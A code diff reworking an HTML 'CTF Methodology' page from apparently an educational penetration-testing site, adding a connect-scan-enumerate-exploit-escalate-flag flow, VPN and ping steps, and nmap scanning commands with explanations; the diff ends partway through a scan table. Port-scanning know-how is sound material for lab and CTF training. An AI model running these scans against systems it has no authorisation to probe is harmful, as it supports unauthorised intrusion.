@@ -12,6 +12,7 @@
         :root {
             --bg-primary: #0a1628;
             --bg-secondary: #0d1c30;
+            --bg-terminal: #0c0c0c;
             --accent-primary: #4a6fa5;
             --accent-light: #7ba3d4;
             --accent-glow: rgba(74, 111, 165, 0.4);
@@ -31,11 +32,13 @@
             --terminal-red: #f87171;
             --terminal-blue: #60a5fa;
             --terminal-purple: #c084fc;
-            --phase-recon: #60a5fa;
+            --terminal-cyan: #22d3ee;
+            --phase-connect: #22d3ee;
+            --phase-scan: #60a5fa;
             --phase-enum: #a78bfa;
             --phase-exploit: #f87171;
-            --phase-post: #4ade80;
-            --phase-docs: #facc15;
+            --phase-escalate: #fb923c;
+            --phase-flag: #4ade80;
         }
 
         body { font-family: var(--font-sans); background: var(--bg-primary); color: var(--text-secondary); min-height: 100vh; line-height: 1.6; }
@@ -74,50 +77,77 @@
         .page { padding-top: 60px; min-height: 100vh; }
         .page-content { max-width: 1000px; margin: 0 auto; padding: 40px 24px 80px; }
 
-        .page-header { text-align: center; margin-bottom: 48px; }
-        .page-title { color: var(--text-primary); font-size: 1.5rem; font-weight: 500; letter-spacing: 1px; margin-bottom: 8px; }
-        .page-subtitle { color: var(--accent-primary); font-family: var(--font-mono); font-size: 0.7rem; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 16px; }
-        .page-intro { color: var(--text-muted); font-size: 0.9rem; max-width: 600px; margin: 0 auto; line-height: 1.7; }
+        /* Hero Section */
+        .hero-section { text-align: center; margin-bottom: 48px; padding-bottom: 40px; border-bottom: 1px solid var(--border-subtle); }
+        .hero-title { color: var(--text-primary); font-size: 2rem; font-weight: 500; letter-spacing: 1px; margin-bottom: 8px; }
+        .hero-subtitle { color: var(--accent-primary); font-family: var(--font-mono); font-size: 0.8rem; letter-spacing: 2px; margin-bottom: 24px; }
+        .hero-intro { color: var(--text-muted); font-size: 0.95rem; max-width: 700px; margin: 0 auto 32px; line-height: 1.7; }
 
         /* Flow Diagram */
-        .flow-diagram { margin: 40px 0 50px; padding: 30px 20px; background: var(--surface-subtle); border-radius: 12px; border: 1px solid var(--border-subtle); }
-        .flow-container { display: flex; align-items: center; justify-content: center; gap: 8px; flex-wrap: wrap; }
-        .flow-phase { display: flex; flex-direction: column; align-items: center; gap: 8px; padding: 16px 20px; background: var(--bg-primary); border: 1px solid var(--border-subtle); border-radius: 8px; min-width: 120px; transition: all 0.2s; cursor: pointer; text-decoration: none; }
-        .flow-phase:hover { border-color: var(--accent-primary); transform: translateY(-2px); }
-        .flow-phase-num { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 1px; }
-        .flow-phase-name { font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-primary); font-weight: 500; }
-        .flow-phase[data-phase="recon"] { border-left: 3px solid var(--phase-recon); }
-        .flow-phase[data-phase="enum"] { border-left: 3px solid var(--phase-enum); }
-        .flow-phase[data-phase="exploit"] { border-left: 3px solid var(--phase-exploit); }
-        .flow-phase[data-phase="post"] { border-left: 3px solid var(--phase-post); }
-        .flow-phase[data-phase="docs"] { border-left: 3px solid var(--phase-docs); }
-        .flow-arrow { color: var(--text-dim); font-size: 1.2rem; }
+        .flow-diagram { margin: 32px 0; padding: 24px; background: var(--surface-subtle); border-radius: 12px; border: 1px solid var(--border-subtle); }
+        .flow-container { display: flex; align-items: center; justify-content: center; gap: 6px; flex-wrap: wrap; }
+        .flow-step { display: flex; flex-direction: column; align-items: center; gap: 6px; padding: 12px 16px; background: var(--bg-primary); border: 1px solid var(--border-subtle); border-radius: 8px; min-width: 90px; transition: all 0.2s; cursor: pointer; text-decoration: none; }
+        .flow-step:hover { border-color: var(--accent-primary); transform: translateY(-2px); }
+        .flow-step-icon { font-size: 1.2rem; }
+        .flow-step-name { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-primary); font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px; }
+        .flow-step[data-step="connect"] { border-top: 3px solid var(--phase-connect); }
+        .flow-step[data-step="scan"] { border-top: 3px solid var(--phase-scan); }
+        .flow-step[data-step="enumerate"] { border-top: 3px solid var(--phase-enum); }
+        .flow-step[data-step="exploit"] { border-top: 3px solid var(--phase-exploit); }
+        .flow-step[data-step="escalate"] { border-top: 3px solid var(--phase-escalate); }
+        .flow-step[data-step="flag"] { border-top: 3px solid var(--phase-flag); }
+        .flow-arrow { color: var(--text-dim); font-size: 1rem; font-family: var(--font-mono); }
         @media (max-width: 700px) {
-            .flow-container { flex-direction: column; gap: 12px; }
+            .flow-container { flex-direction: column; gap: 8px; }
             .flow-arrow { transform: rotate(90deg); }
-            .flow-phase { width: 100%; max-width: 200px; }
+            .flow-step { width: 100%; max-width: 160px; }
         }
+        .flow-summary { text-align: center; margin-top: 20px; font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-muted); line-height: 1.8; }
 
         /* Phase Sections */
-        .phase-section { margin-bottom: 40px; border: 1px solid var(--border-subtle); border-radius: 12px; overflow: hidden; }
+        .phase-section { margin-bottom: 32px; border: 1px solid var(--border-subtle); border-radius: 12px; overflow: hidden; }
         .phase-header { padding: 20px 24px; background: var(--surface-subtle); border-bottom: 1px solid var(--border-subtle); cursor: pointer; display: flex; align-items: center; gap: 16px; transition: background 0.2s; }
         .phase-header:hover { background: var(--surface-medium); }
         .phase-icon { width: 44px; height: 44px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 1.3rem; flex-shrink: 0; }
         .phase-header-content { flex: 1; }
         .phase-number { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 1px; margin-bottom: 4px; }
         .phase-title { font-size: 1.1rem; font-weight: 500; color: var(--text-primary); margin-bottom: 4px; }
-        .phase-question { font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-muted); font-style: italic; }
+        .phase-subtitle { font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-muted); font-style: italic; }
         .phase-toggle { font-family: var(--font-mono); font-size: 0.7rem; color: var(--accent-primary); padding: 6px 12px; border: 1px solid var(--border-subtle); border-radius: 4px; background: var(--bg-primary); }
 
-        .phase-section[data-phase="recon"] .phase-icon { background: rgba(96, 165, 250, 0.15); color: var(--phase-recon); border: 1px solid rgba(96, 165, 250, 0.3); }
+        .phase-section[data-phase="connect"] .phase-icon { background: rgba(34, 211, 238, 0.15); color: var(--phase-connect); border: 1px solid rgba(34, 211, 238, 0.3); }
+        .phase-section[data-phase="scan"] .phase-icon { background: rgba(96, 165, 250, 0.15); color: var(--phase-scan); border: 1px solid rgba(96, 165, 250, 0.3); }
         .phase-section[data-phase="enum"] .phase-icon { background: rgba(167, 139, 250, 0.15); color: var(--phase-enum); border: 1px solid rgba(167, 139, 250, 0.3); }
         .phase-section[data-phase="exploit"] .phase-icon { background: rgba(248, 113, 113, 0.15); color: var(--phase-exploit); border: 1px solid rgba(248, 113, 113, 0.3); }
-        .phase-section[data-phase="post"] .phase-icon { background: rgba(74, 222, 128, 0.15); color: var(--phase-post); border: 1px solid rgba(74, 222, 128, 0.3); }
-        .phase-section[data-phase="docs"] .phase-icon { background: rgba(250, 204, 21, 0.15); color: var(--phase-docs); border: 1px solid rgba(250, 204, 21, 0.3); }
+        .phase-section[data-phase="escalate"] .phase-icon { background: rgba(251, 146, 60, 0.15); color: var(--phase-escalate); border: 1px solid rgba(251, 146, 60, 0.3); }
+        .phase-section[data-phase="flag"] .phase-icon { background: rgba(74, 222, 128, 0.15); color: var(--phase-flag); border: 1px solid rgba(74, 222, 128, 0.3); }
 
         .phase-content { padding: 24px; display: none; }
         .phase-section.open .phase-content { display: block; }
         .phase-section.open .phase-toggle { background: var(--surface-subtle); }
+
+        /* Command Blocks */
+        .command-block { background: var(--bg-terminal); border-radius: 8px; padding: 16px 20px; margin: 16px 0; font-family: var(--font-mono); font-size: 0.8rem; overflow-x: auto; }
+        .command-block-title { font-size: 0.65rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; }
+        .command-line { color: #aaa; margin-bottom: 4px; }
+        .command-line .prompt { color: var(--terminal-green); }
+        .command-line .cmd { color: #fff; }
+        .command-line .flag { color: var(--terminal-yellow); }
+        .command-line .comment { color: #666; font-style: italic; }
+
+        /* Prominent Command */
+        .command-prominent { background: var(--bg-terminal); border: 1px solid var(--terminal-green); border-radius: 8px; padding: 16px 20px; margin: 20px 0; position: relative; }
+        .command-prominent code { font-family: var(--font-mono); font-size: 0.9rem; color: var(--terminal-green); display: block; padding-right: 70px; word-break: break-all; }
+        .command-copy { position: absolute; top: 50%; right: 16px; transform: translateY(-50%); font-family: var(--font-mono); font-size: 0.65rem; color: var(--accent-primary); padding: 6px 12px; border: 1px solid var(--border-subtle); border-radius: 4px; background: var(--bg-primary); cursor: pointer; transition: all 0.2s; }
+        .command-copy:hover { background: var(--surface-medium); color: var(--text-primary); }
+        .command-copy.copied { background: var(--terminal-green); color: var(--bg-primary); border-color: var(--terminal-green); }
+
+        /* Flag Explanation */
+        .flag-explanation { margin: 20px 0; }
+        .flag-item { display: flex; gap: 16px; padding: 10px 0; border-bottom: 1px solid var(--border-subtle); }
+        .flag-item:last-child { border-bottom: none; }
+        .flag-code { font-family: var(--font-mono); font-size: 0.85rem; color: var(--terminal-yellow); min-width: 60px; flex-shrink: 0; }
+        .flag-desc { font-size: 0.85rem; color: var(--text-secondary); }
 
         /* Reference Tables */
         .reference-table { background: var(--bg-primary); border-radius: 8px; overflow: hidden; border: 1px solid var(--border-subtle); margin-bottom: 20px; }
@@ -130,14 +160,16 @@
         .reference-table tr:hover td { background: var(--surface-subtle); }
         .reference-table code { font-family: var(--font-mono); font-size: 0.8rem; color: var(--terminal-green); background: rgba(74, 222, 128, 0.1); padding: 2px 6px; border-radius: 3px; }
 
-        /* Command blocks */
-        .command-block { background: #0c0c0c; border-radius: 8px; padding: 16px 20px; margin: 16px 0; font-family: var(--font-mono); font-size: 0.8rem; overflow-x: auto; }
-        .command-block-title { font-size: 0.65rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; }
-        .command-line { color: #aaa; margin-bottom: 4px; }
-        .command-line .prompt { color: var(--terminal-green); }
-        .command-line .cmd { color: #fff; }
-        .command-line .flag { color: var(--terminal-yellow); }
-        .command-line .comment { color: #666; font-style: italic; }
+        /* Step Tables */
+        .step-table { background: var(--bg-primary); border-radius: 8px; overflow: hidden; border: 1px solid var(--border-subtle); margin: 16px 0; }
+        .step-table table { width: 100%; border-collapse: collapse; }
+        .step-table th, .step-table td { padding: 12px 16px; text-align: left; border-bottom: 1px solid var(--border-subtle); }
+        .step-table th { font-family: var(--font-mono); font-size: 0.65rem; color: var(--accent-primary); text-transform: uppercase; letter-spacing: 1px; background: var(--surface-subtle); }
+        .step-table td { font-size: 0.85rem; color: var(--text-secondary); vertical-align: top; }
+        .step-table tr:last-child td { border-bottom: none; }
+        .step-table tr:hover td { background: var(--surface-subtle); }
+        .step-table .step-num { font-family: var(--font-mono); color: var(--accent-light); font-weight: 500; width: 40px; }
+        .step-table code { font-family: var(--font-mono); font-size: 0.8rem; color: var(--terminal-green); background: rgba(74, 222, 128, 0.1); padding: 2px 6px; border-radius: 3px; word-break: break-all; }
 
         /* Checklists */
         .checklist { background: var(--surface-subtle); border-radius: 8px; padding: 16px 20px; margin-top: 20px; }
@@ -149,30 +181,121 @@
         .checklist-checkbox.checked { background: var(--accent-primary); }
         .checklist-checkbox.checked::after { content: '✓'; color: var(--bg-primary); font-size: 0.7rem; font-weight: bold; }
         .checklist-label { font-size: 0.85rem; color: var(--text-secondary); }
+        .checklist-label code { font-family: var(--font-mono); font-size: 0.8rem; color: var(--terminal-green); background: rgba(74, 222, 128, 0.1); padding: 2px 6px; border-radius: 3px; }
         .checklist-item.checked .checklist-label { color: var(--text-dim); text-decoration: line-through; }
 
-        /* Section titles */
-        .section-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--accent-primary); text-transform: uppercase; letter-spacing: 1px; margin: 24px 0 12px; }
+        /* Callouts */
+        .callout { padding: 16px 20px; border-radius: 8px; margin: 20px 0; font-size: 0.85rem; display: flex; align-items: flex-start; gap: 12px; }
+        .callout-icon { font-size: 1.1rem; flex-shrink: 0; }
+        .callout-content { flex: 1; }
+        .callout-title { font-family: var(--font-mono); font-size: 0.7rem; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; }
+        .callout-tip { background: rgba(74, 222, 128, 0.1); border: 1px solid rgba(74, 222, 128, 0.3); }
+        .callout-tip .callout-title { color: var(--terminal-green); }
+        .callout-tip .callout-icon { color: var(--terminal-green); }
+        .callout-warning { background: rgba(248, 113, 113, 0.1); border: 1px solid rgba(248, 113, 113, 0.3); }
+        .callout-warning .callout-title { color: var(--terminal-red); }
+        .callout-warning .callout-icon { color: var(--terminal-red); }
+        .callout-info { background: rgba(96, 165, 250, 0.1); border: 1px solid rgba(96, 165, 250, 0.3); }
+        .callout-info .callout-title { color: var(--terminal-blue); }
+        .callout-info .callout-icon { color: var(--terminal-blue); }
 
-        /* Flag locations */
+        /* Connection Diagram */
+        .connection-diagram { display: flex; align-items: center; justify-content: center; gap: 16px; padding: 24px; background: var(--bg-primary); border-radius: 8px; border: 1px solid var(--border-subtle); margin: 20px 0; flex-wrap: wrap; }
+        .connection-node { display: flex; flex-direction: column; align-items: center; gap: 8px; padding: 16px 20px; background: var(--surface-subtle); border: 1px solid var(--border-subtle); border-radius: 8px; min-width: 100px; }
+        .connection-node-icon { font-size: 1.5rem; }
+        .connection-node-label { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-primary); text-align: center; }
+        .connection-arrow { font-family: var(--font-mono); color: var(--accent-primary); font-size: 1.2rem; }
+        @media (max-width: 600px) {
+            .connection-diagram { flex-direction: column; }
+            .connection-arrow { transform: rotate(90deg); }
+        }
+
+        /* Decision Tree */
+        .decision-tree { margin: 24px 0; }
+        .decision-root { text-align: center; padding: 16px 24px; background: var(--surface-medium); border: 1px solid var(--accent-primary); border-radius: 8px; font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-primary); margin-bottom: 20px; }
+        .decision-branches { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 12px; }
+        .decision-branch { display: flex; flex-direction: column; align-items: center; gap: 8px; padding: 16px; background: var(--bg-primary); border: 1px solid var(--border-subtle); border-radius: 8px; text-decoration: none; transition: all 0.2s; cursor: pointer; }
+        .decision-branch:hover { border-color: var(--accent-primary); transform: translateY(-2px); }
+        .decision-branch-port { font-family: var(--font-mono); font-size: 0.75rem; color: var(--terminal-yellow); }
+        .decision-branch-name { font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-primary); }
+        .decision-branch-icon { font-size: 1.2rem; }
+
+        /* Service Cards */
+        .service-cards { margin-top: 24px; }
+        .service-card { border: 1px solid var(--border-subtle); border-radius: 8px; margin-bottom: 16px; overflow: hidden; }
+        .service-header { padding: 16px 20px; background: var(--bg-primary); cursor: pointer; display: flex; align-items: center; gap: 16px; transition: background 0.2s; }
+        .service-header:hover { background: var(--surface-subtle); }
+        .service-icon { width: 40px; height: 40px; border-radius: 6px; display: flex; align-items: center; justify-content: center; font-size: 1.2rem; flex-shrink: 0; }
+        .service-header-content { flex: 1; }
+        .service-title { font-size: 0.95rem; font-weight: 500; color: var(--text-primary); }
+        .service-ports { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-muted); margin-top: 2px; }
+        .service-toggle { font-family: var(--font-mono); font-size: 0.65rem; color: var(--accent-primary); padding: 4px 10px; border: 1px solid var(--border-subtle); border-radius: 4px; background: var(--bg-primary); }
+
+        .service-card[data-service="web"] .service-icon { background: rgba(96, 165, 250, 0.15); color: var(--terminal-blue); border: 1px solid rgba(96, 165, 250, 0.3); }
+        .service-card[data-service="ftp"] .service-icon { background: rgba(250, 204, 21, 0.15); color: var(--terminal-yellow); border: 1px solid rgba(250, 204, 21, 0.3); }
+        .service-card[data-service="smb"] .service-icon { background: rgba(167, 139, 250, 0.15); color: var(--terminal-purple); border: 1px solid rgba(167, 139, 250, 0.3); }
+        .service-card[data-service="ssh"] .service-icon { background: rgba(74, 222, 128, 0.15); color: var(--terminal-green); border: 1px solid rgba(74, 222, 128, 0.3); }
+        .service-card[data-service="other"] .service-icon { background: rgba(248, 113, 113, 0.15); color: var(--terminal-red); border: 1px solid rgba(248, 113, 113, 0.3); }
+
+        .service-content { padding: 20px; display: none; border-top: 1px solid var(--border-subtle); background: var(--surface-subtle); }
+        .service-card.open .service-content { display: block; }
+        .service-card.open .service-toggle { background: var(--surface-subtle); }
+
+        .service-goal { font-family: var(--font-mono); font-size: 0.7rem; color: var(--accent-primary); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
+        .service-goal-text { font-size: 0.9rem; color: var(--text-secondary); margin-bottom: 16px; }
+
+        /* Findings List */
+        .findings-list { margin-top: 16px; }
+        .findings-title { font-family: var(--font-mono); font-size: 0.7rem; color: var(--accent-primary); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; }
+        .finding-item { display: flex; gap: 12px; padding: 10px 0; border-bottom: 1px solid var(--border-subtle); font-size: 0.85rem; }
+        .finding-item:last-child { border-bottom: none; }
+        .finding-trigger { color: var(--terminal-yellow); font-family: var(--font-mono); min-width: 180px; flex-shrink: 0; }
+        .finding-action { color: var(--text-secondary); }
+
+        /* Privesc Subsections */
+        .privesc-section { margin-bottom: 24px; }
+        .privesc-title { font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-primary); display: flex; align-items: center; gap: 10px; margin-bottom: 16px; padding-bottom: 8px; border-bottom: 1px solid var(--border-subtle); }
+        .privesc-title span { font-size: 1.1rem; }
+
+        /* Flag Locations */
         .flag-locations { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 16px; }
         .flag-card { background: var(--bg-primary); border: 1px solid var(--border-subtle); border-radius: 8px; padding: 16px; }
-        .flag-card-title { font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-primary); margin-bottom: 10px; display: flex; align-items: center; gap: 8px; }
+        .flag-card-title { font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-primary); margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
         .flag-card-title span { font-size: 1rem; }
-        .flag-path { font-family: var(--font-mono); font-size: 0.8rem; color: var(--terminal-purple); margin-bottom: 4px; }
+        .flag-path { font-family: var(--font-mono); font-size: 0.8rem; color: var(--terminal-purple); margin-bottom: 6px; }
         @media (max-width: 600px) {
             .flag-locations { grid-template-columns: 1fr; }
         }
 
-        /* Troubleshooting */
-        .troubleshooting-section { margin-top: 50px; padding-top: 40px; border-top: 1px solid var(--border-subtle); }
-        .troubleshooting-title { font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-primary); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 20px; text-align: center; }
+        /* Stuck Section */
+        .stuck-section { margin-top: 50px; padding: 32px; background: var(--surface-subtle); border-radius: 12px; border: 1px solid var(--border-subtle); }
+        .stuck-header { display: flex; align-items: center; gap: 16px; margin-bottom: 24px; }
+        .stuck-icon { font-size: 2rem; }
+        .stuck-title { font-family: var(--font-mono); font-size: 1rem; color: var(--text-primary); text-transform: uppercase; letter-spacing: 2px; }
 
-        /* Documentation list */
-        .doc-list { list-style: none; }
-        .doc-list li { padding: 10px 0; border-bottom: 1px solid var(--border-subtle); font-size: 0.9rem; color: var(--text-secondary); display: flex; align-items: center; gap: 12px; }
-        .doc-list li:last-child { border-bottom: none; }
-        .doc-list li::before { content: '→'; color: var(--accent-primary); font-family: var(--font-mono); }
+        /* Glossary */
+        .glossary-section { margin-top: 50px; padding-top: 40px; border-top: 1px solid var(--border-subtle); }
+        .glossary-title { font-family: var(--font-mono); font-size: 0.9rem; color: var(--text-primary); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 20px; text-align: center; }
+        .glossary-table { background: var(--bg-primary); border-radius: 8px; overflow: hidden; border: 1px solid var(--border-subtle); }
+        .glossary-table table { width: 100%; border-collapse: collapse; }
+        .glossary-table th, .glossary-table td { padding: 14px 20px; text-align: left; border-bottom: 1px solid var(--border-subtle); }
+        .glossary-table th { font-family: var(--font-mono); font-size: 0.65rem; color: var(--accent-primary); text-transform: uppercase; letter-spacing: 1px; background: var(--surface-subtle); }
+        .glossary-table td { font-size: 0.85rem; }
+        .glossary-table td:first-child { font-family: var(--font-mono); color: var(--terminal-cyan); font-weight: 500; width: 180px; }
+        .glossary-table td:last-child { color: var(--text-secondary); }
+        .glossary-table tr:last-child td { border-bottom: none; }
+        .glossary-table tr:hover td { background: var(--surface-subtle); }
+
+        /* Section labels */
+        .section-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--accent-primary); text-transform: uppercase; letter-spacing: 1px; margin: 24px 0 12px; }
+
+        /* Payload blocks */
+        .payload-block { background: var(--bg-terminal); border-radius: 8px; padding: 16px 20px; margin: 12px 0; font-family: var(--font-mono); font-size: 0.8rem; position: relative; }
+        .payload-label { font-size: 0.65rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
+        .payload-code { color: var(--terminal-green); word-break: break-all; }
+        .payload-copy { position: absolute; top: 12px; right: 12px; font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent-primary); padding: 4px 8px; border: 1px solid var(--border-subtle); border-radius: 3px; background: var(--bg-primary); cursor: pointer; transition: all 0.2s; }
+        .payload-copy:hover { background: var(--surface-medium); }
+        .payload-copy.copied { background: var(--terminal-green); color: var(--bg-primary); border-color: var(--terminal-green); }
     </style>
 </head>
 <body>
@@ -190,6 +313,10 @@
                         <a href="network-fundamentals.html" class="nav-dropdown-item">
                             <div class="nav-dropdown-item-title">Network Fundamentals</div>
                             <div class="nav-dropdown-item-desc">IPs, ports, servers & clients</div>
+                        </a>
+                        <a href="protocols.html" class="nav-dropdown-item">
+                            <div class="nav-dropdown-item-title">Protocol Reference</div>
+                            <div class="nav-dropdown-item-desc">How services communicate</div>
                         </a>
                         <a href="ports.html" class="nav-dropdown-item">
                             <div class="nav-dropdown-item-title">Ports Reference</div>
@@ -287,417 +414,1027 @@
 
     <div class="page">
         <div class="page-content">
-            <header class="page-header">
-                <h1 class="page-title">CTF Methodology</h1>
-                <p class="page-subtitle">A Systematic Approach to Capture-the-Flag Challenges</p>
-                <p class="page-intro">A practical checklist for penetration testing practice and CTF exercises. Work through each phase systematically — don't skip steps.</p>
+            <!-- Hero Section -->
+            <header class="hero-section">
+                <h1 class="hero-title">CTF Methodology</h1>
+                <p class="hero-subtitle">Zero to Root — A systematic approach to capture-the-flag challenges</p>
+                <p class="hero-intro">A step-by-step decision tree for penetration testing practice. Follow the flow: Scan to find doors, Enumerate to understand them, Exploit to get in, Escalate to own the system.</p>
+
+                <!-- Flow Diagram -->
+                <div class="flow-diagram">
+                    <div class="flow-container">
+                        <a href="#phase-0" class="flow-step" data-step="connect">
+                            <span class="flow-step-icon">🔌</span>
+                            <span class="flow-step-name">Connect</span>
+                        </a>
+                        <span class="flow-arrow">→</span>
+                        <a href="#phase-1" class="flow-step" data-step="scan">
+                            <span class="flow-step-icon">📡</span>
+                            <span class="flow-step-name">Scan</span>
+                        </a>
+                        <span class="flow-arrow">→</span>
+                        <a href="#phase-2" class="flow-step" data-step="enumerate">
+                            <span class="flow-step-icon">🔍</span>
+                            <span class="flow-step-name">Enumerate</span>
+                        </a>
+                        <span class="flow-arrow">→</span>
+                        <a href="#phase-3" class="flow-step" data-step="exploit">
+                            <span class="flow-step-icon">💥</span>
+                            <span class="flow-step-name">Exploit</span>
+                        </a>
+                        <span class="flow-arrow">→</span>
+                        <a href="#phase-4" class="flow-step" data-step="escalate">
+                            <span class="flow-step-icon">⬆️</span>
+                            <span class="flow-step-name">Escalate</span>
+                        </a>
+                        <span class="flow-arrow">→</span>
+                        <a href="#phase-5" class="flow-step" data-step="flag">
+                            <span class="flow-step-icon">🚩</span>
+                            <span class="flow-step-name">Flag</span>
+                        </a>
+                    </div>
+                    <p class="flow-summary">Don't skip steps. Document everything. When stuck, go back and enumerate harder.</p>
+                </div>
             </header>
 
-            <!-- Flow Diagram -->
-            <div class="flow-diagram">
-                <div class="flow-container">
-                    <a href="#recon" class="flow-phase" data-phase="recon">
-                        <span class="flow-phase-num">PHASE 1</span>
-                        <span class="flow-phase-name">Reconnaissance</span>
-                    </a>
-                    <span class="flow-arrow">→</span>
-                    <a href="#enum" class="flow-phase" data-phase="enum">
-                        <span class="flow-phase-num">PHASE 2</span>
-                        <span class="flow-phase-name">Enumeration</span>
-                    </a>
-                    <span class="flow-arrow">→</span>
-                    <a href="#exploit" class="flow-phase" data-phase="exploit">
-                        <span class="flow-phase-num">PHASE 3</span>
-                        <span class="flow-phase-name">Exploitation</span>
-                    </a>
-                    <span class="flow-arrow">→</span>
-                    <a href="#post" class="flow-phase" data-phase="post">
-                        <span class="flow-phase-num">PHASE 4</span>
-                        <span class="flow-phase-name">Post-Exploitation</span>
-                    </a>
-                    <span class="flow-arrow">→</span>
-                    <a href="#docs" class="flow-phase" data-phase="docs">
-                        <span class="flow-phase-num">PHASE 5</span>
-                        <span class="flow-phase-name">Documentation</span>
-                    </a>
+            <!-- Phase 0: Connect -->
+            <section id="phase-0" class="phase-section open" data-phase="connect">
+                <div class="phase-header" onclick="togglePhase(this)">
+                    <div class="phase-icon">🔌</div>
+                    <div class="phase-header-content">
+                        <div class="phase-number">PHASE 0</div>
+                        <div class="phase-title">Connect to the Target</div>
+                        <div class="phase-subtitle">"Before anything else, make sure you can reach the target"</div>
+                    </div>
+                    <span class="phase-toggle">COLLAPSE</span>
                 </div>
-            </div>
+                <div class="phase-content">
+                    <div class="connection-diagram">
+                        <div class="connection-node">
+                            <div class="connection-node-icon">💻</div>
+                            <div class="connection-node-label">Your Machine</div>
+                        </div>
+                        <span class="connection-arrow">→</span>
+                        <div class="connection-node">
+                            <div class="connection-node-icon">🔒</div>
+                            <div class="connection-node-label">VPN Tunnel</div>
+                        </div>
+                        <span class="connection-arrow">→</span>
+                        <div class="connection-node">
+                            <div class="connection-node-icon">🌐</div>
+                            <div class="connection-node-label">Target Network</div>
+                        </div>
+                        <span class="connection-arrow">→</span>
+                        <div class="connection-node">
+                            <div class="connection-node-icon">🎯</div>
+                            <div class="connection-node-label">Target IP</div>
+                        </div>
+                    </div>
 
-            <!-- Phase 1: Reconnaissance -->
-            <section id="recon" class="phase-section open" data-phase="recon">
+                    <div class="section-label">VPN Connection (if required)</div>
+                    <div class="command-prominent">
+                        <code>sudo openvpn lab.ovpn</code>
+                        <div class="command-copy" onclick="copyCommand(this)">COPY</div>
+                    </div>
+
+                    <div class="section-label">Confirm Connectivity</div>
+                    <div class="command-prominent">
+                        <code>ping -c 3 &lt;target-ip&gt;</code>
+                        <div class="command-copy" onclick="copyCommand(this)">COPY</div>
+                    </div>
+
+                    <div class="checklist">
+                        <div class="checklist-title">✓ Pre-Flight Checklist</div>
+                        <div class="checklist-item" data-id="vpn-connected">
+                            <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
+                            <span class="checklist-label">VPN connected (if required)</span>
+                        </div>
+                        <div class="checklist-item" data-id="target-ip">
+                            <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
+                            <span class="checklist-label">Target IP address noted</span>
+                        </div>
+                        <div class="checklist-item" data-id="ping-success">
+                            <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
+                            <span class="checklist-label">Ping successful (target is reachable)</span>
+                        </div>
+                        <div class="checklist-item" data-id="notes-ready">
+                            <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
+                            <span class="checklist-label">Notes document ready</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Phase 1: Scan -->
+            <section id="phase-1" class="phase-section open" data-phase="scan">
+                <div class="phase-header" onclick="togglePhase(this)">
+                    <div class="phase-icon">📡</div>
+                    <div class="phase-header-content">
+                        <div class="phase-number">PHASE 1</div>
+                        <div class="phase-title">Scan — Find the Doors</div>
+                        <div class="phase-subtitle">"You cannot attack what you cannot see"</div>
+                    </div>
+                    <span class="phase-toggle">COLLAPSE</span>
+                </div>
+                <div class="phase-content">
+                    <div class="section-label">Primary Scan Command</div>
+                    <div class="command-prominent">
+                        <code>nmap -sC -sV -oN nmap_initial.txt &lt;target-ip&gt;</code>
+                        <div class="command-copy" onclick="copyCommand(this)">COPY</div>
+                    </div>
+
+                    <div class="flag-explanation">
+                        <div class="flag-item">
+                            <span class="flag-code">-sC</span>
+                            <span class="flag-desc">Run default scripts — checks for common vulnerabilities and gathers extra info</span>
+                        </div>
+                        <div class="flag-item">
+                            <span class="flag-code">-sV</span>
+                            <span class="flag-desc">Detect service versions — crucial for finding exploits (e.g., Apache 2.4.49)</span>
+                        </div>
+                        <div class="flag-item">
+                            <span class="flag-code">-oN</span>
+                            <span class="flag-desc">Save output to file — always document your findings</span>
+                        </div>
+                    </div>
+
+                    <div class="section-label">Additional Scans</div>
+                    <div class="reference-table">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Situation</th>
+                                    <th>Command</th>
+                                    <th>When to Use</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>Quick scan</td>
+                                    <td><code>nmap -F &lt;ip&gt;</code></td>
+                                    <td>Initial fast look (top 100 ports)</td>
+                                </tr>
+                                <tr>
+                                    <td>All ports</td>
+                                    <td><code>nmap -p- &lt;ip&gt;</code></td>
+                                    <td>When default scan finds little — checks all 65535</td>
+                                </tr>
+                                <tr>
+                                    <td>UDP scan</td>
+                                    <td><code>nmap -sU --top-ports 20 &lt;ip&gt;</code></td>
+                                    <td>When TCP shows nothing interesting</td>
+                                </tr>
+                                <tr>
